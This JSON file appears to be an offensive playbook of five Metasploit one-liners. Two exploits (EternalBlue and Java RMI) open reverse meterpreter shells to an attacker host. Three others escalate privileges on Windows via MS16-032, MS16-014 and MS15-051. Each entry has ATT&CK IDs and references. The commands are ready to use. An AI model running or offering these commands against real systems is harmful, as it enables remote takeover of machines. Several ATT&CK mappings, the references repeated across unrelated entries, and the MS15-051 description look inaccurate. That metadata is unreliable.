{
  "exploits": [
    {
      "command": "msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <target_ip>; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <attacker_ip>; exploit'",
      "references": [
        "https://attack.mitre.org/groups/G0007/",
        "https://www.fireeye.com/blog/threat-research/2017/05/behind-the-parallel-apt28s-infra.html"
      ],
      "attck_mapping": [
        "T1068",
        "T1021.001",
        "T1021.002"
      ],
      "description": "This command uses the EternalBlue exploit to target Windows systems vulnerable to MS17-010. It establishes a reverse TCP meterpreter shell on the attacker's machine."
    },
    {
      "command": "msfconsole -x 'use exploit/multi/misc/java_rmi_server; set RHOSTS <target_ip>; set PAYLOAD java/meterpreter/reverse_tcp; set LHOST <attacker_ip>; exploit'",
      "references": [
        "https://attack.mitre.org/groups/G0007/",
        "https://www.fireeye.com/blog/threat-research/2017/05/behind-the-parallel-apt28s-infra.html"
      ],
      "attck_mapping": [
        "T1059.003",
        "T1021.001",
        "T1021.002"
      ],
      "description": "This command exploits a vulnerability in Java RMI servers to establish a reverse TCP meterpreter shell on the attacker's machine."
    },
    {
      "command": "msfconsole -x 'use exploit/windows/local/ms16_032_secondary_logon_handle_privesc; set SESSION <session_id>; exploit'",
      "references": [
        "https://attack.mitre.org/groups/G0007/",
        "https://www.fireeye.com/blog/threat-research/2017/05/behind-the-parallel-apt28s-infra.html"
      ],
      "attck_mapping": [
        "T1055.002",
        "T1068",
        "T1035"
      ],
      "description": "This command exploits the MS16-032 vulnerability to escalate privileges on a compromised Windows system."
    },
    {
      "command": "msfconsole -x 'use exploit/windows/local/ms16_014_wmi_recv_notif; set SESSION <session_id>; exploit'",
      "references": [
        "https://attack.mitre.org/groups/G0007/",
        "https://www.fireeye.com/blog/threat-research/2017/05/behind-the-parallel-apt28s-infra.html"
      ],
      "attck_mapping": [
        "T1055.002",
        "T1068",
        "T1035"
      ],
      "description": "This command exploits the MS16-014 vulnerability to escalate privileges on a compromised Windows system using WMI."
    },
    {
      "command": "msfconsole -x 'use exploit/windows/local/ms15_051_client_copy_image; set SESSION <session_id>; exploit'",
      "references": [
        "https://attack.mitre.org/groups/G0007/",
        "https://www.fireeye.com/blog/threat-research/2017/05/behind-the-parallel-apt28s-infra.html"
      ],
      "attck_mapping": [
        "T1055.002",
        "T1068",
        "T1035"
      ],
      "description": "This command exploits the MS15-051 vulnerability to escalate privileges on a compromised Windows system by copying an image to the client."
    }
  ]
}